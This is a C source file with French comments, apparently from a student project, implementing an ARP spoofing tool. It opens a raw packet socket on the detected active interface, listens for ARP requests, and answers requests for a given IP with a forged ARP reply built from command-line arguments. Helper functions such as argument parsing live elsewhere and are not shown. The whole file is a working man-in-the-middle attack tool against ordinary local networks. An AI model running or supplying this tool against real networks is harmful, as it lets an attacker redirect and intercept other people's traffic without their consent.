#include "arp_spoofing.h"
#include <sys/ioctl.h>
#include <net/if.h>
#include <linux/if_packet.h>
#include <stdio.h>
#include <arpa/inet.h>
#include <ifaddrs.h>
#include <signal.h>

// Variable globale pour la socket brute (unique autorisée)
static int g_sock_raw = -1;

/* Gestionnaire du signal SIGINT pour une sortie propre */
void sigint_handler(int signum)
{
    (void)signum; // pour éviter un warning sur la variable inutilisée
    if (g_sock_raw != -1)
        close(g_sock_raw);
    printf("\n[INFO] Exiting program due to Ctrl+C\n");
    exit(EXIT_SUCCESS);
}

/* Fonction pour détecter l'interface réseau active (non-loopback et UP) */
char *get_active_interface(void)
{
    struct ifaddrs *ifaddr, *ifa;
    static char interface_name[IFNAMSIZ];

    if (getifaddrs(&ifaddr) == -1) {
        perror("getifaddrs");
        // En cas d'erreur, retourne "eth0" par défaut
        strncpy(interface_name, "eth0", IFNAMSIZ - 1);
        interface_name[IFNAMSIZ - 1] = '\0';
        return interface_name;
    }

    interface_name[0] = '\0';
    for (ifa = ifaddr; ifa != NULL; ifa = ifa->ifa_next) {
        if (ifa->ifa_addr && ifa->ifa_addr->sa_family == AF_PACKET) {
            // Vérifie que l'interface est UP et n'est pas loopback
            if ((ifa->ifa_flags & IFF_UP) && !(ifa->ifa_flags & IFF_LOOPBACK)) {
                strncpy(interface_name, ifa->ifa_name, IFNAMSIZ - 1);
                interface_name[IFNAMSIZ - 1] = '\0';
                break;
            }
        }
    }
    freeifaddrs(ifaddr);

    if (interface_name[0] == '\0')
        strncpy(interface_name, "eth0", IFNAMSIZ);
    return interface_name;
}

void print_arp_packet(const t_arp_packet *arp_pkt) 
{
    char sender_ip[INET_ADDRSTRLEN], target_ip[INET_ADDRSTRLEN];

    inet_ntop(AF_INET, arp_pkt->sender_ip, sender_ip, INET_ADDRSTRLEN);
    inet_ntop(AF_INET, arp_pkt->target_ip, target_ip, INET_ADDRSTRLEN);

    printf("\n===== Paquet ARP Reçu =====\n");
    printf("Type matériel      : %hu\n", ntohs(arp_pkt->htype));
    printf("Type protocole     : 0x%04x\n", ntohs(arp_pkt->ptype));
    printf("Longueur MAC       : %u\n", arp_pkt->hlen);
    printf("Longueur IP        : %u\n", arp_pkt->plen);
    printf("Opcode             : %s (%hu)\n", 
        (ntohs(arp_pkt->opcode) == ARPOP_REQUEST) ? "Requête" : "Réponse", 
        ntohs(arp_pkt->opcode));

    printf("Expéditeur MAC     : %02x:%02x:%02x:%02x:%02x:%02x\n",
        arp_pkt->sender_mac[0], arp_pkt->sender_mac[1], arp_pkt->sender_mac[2], 
        arp_pkt->sender_mac[3], arp_pkt->sender_mac[4], arp_pkt->sender_mac[5]);

    printf("Expéditeur IP      : %s\n", sender_ip);

    printf("Cible MAC          : %02x:%02x:%02x:%02x:%02x:%02x\n",
        arp_pkt->target_mac[0], arp_pkt->target_mac[1], arp_pkt->target_mac[2], 
        arp_pkt->target_mac[3], arp_pkt->target_mac[4], arp_pkt->target_mac[5]);

    printf("Cible IP           : %s\n", target_ip);
    printf("===========================\n\n");
}

ssize_t send_arp_reply(int sock_raw, const t_arp_packet *arp_reply, const char *iface)
{
    struct sockaddr_ll addr = {0};
    struct ifreq ifr = {0};

    ft_strncpy(ifr.ifr_name, iface, IFNAMSIZ - 1);
    if (ioctl(sock_raw, SIOCGIFINDEX, &ifr) == -1) {
        perror("ioctl SIOCGIFINDEX");
        return -1;
    }

    addr.sll_ifindex = ifr.ifr_ifindex;
    addr.sll_halen = ETH_ALEN;
    ft_memcpy(addr.sll_addr, arp_reply->target_mac, ETH_ALEN);

    ssize_t sent_bytes = sendto(sock_raw, arp_reply, sizeof(t_arp_packet), 0,
                                (struct sockaddr *)&addr, sizeof(addr));
    return sent_bytes;
}

int main(int argc, char *argv[])
{
    char buffer[BUF_REQUEST];
    ssize_t recv_len;
    t_arp_packet reponse;

    /* Enregistrement du gestionnaire de SIGINT pour gérer Ctrl+C */
    signal(SIGINT, sigint_handler);

    if (!parsing_arg(argc, argv, &reponse))
        return EXIT_FAILURE;
    
    int sock_raw = socket(AF_PACKET, SOCK_RAW, htons(ETH_P_ARP));
    if (sock_raw < 0)
    {
        fprintf(stderr, "Erreur lors de la création de la socket\n");
        return EXIT_FAILURE;
    }
    g_sock_raw = sock_raw; // assignation à la variable globale

    /* Détection automatique de l'interface active */
    char *iface = get_active_interface();
    printf("[INFO] Found available interface: %s\n", iface);

    while (1)
    {
        recv_len = recvfrom(sock_raw, buffer, sizeof(buffer), 0, NULL, NULL);
        if (recv_len < 0)
        {
            perror("Erreur lors de la réception du paquet ARP");
            continue;
        }

        if (recv_len < (ssize_t)(ETH_HLEN + sizeof(t_arp_packet)))
        {
            fprintf(stderr, "Paquet reçu trop court (%ld octets)\n", recv_len);
            continue;
        }

        t_arp_packet *arp_pkt = (t_arp_packet *)(buffer + ETH_HLEN);
        print_arp_packet(arp_pkt);
        if (get_arp_request(arp_pkt, argv[1]))
        {
            printf("[INFO] Envoi de la réponse ARP spoofée...\n");
            if (send_arp_reply(sock_raw, &reponse, iface) < 0)
            {
                perror("Erreur envoi ARP spoofée");
                close(sock_raw);
                return EXIT_FAILURE;
            }
            printf("[INFO] Réponse ARP envoyée avec succès.\n");
            continue ;
        }
    }
    close(sock_raw);

    return EXIT_SUCCESS;
}
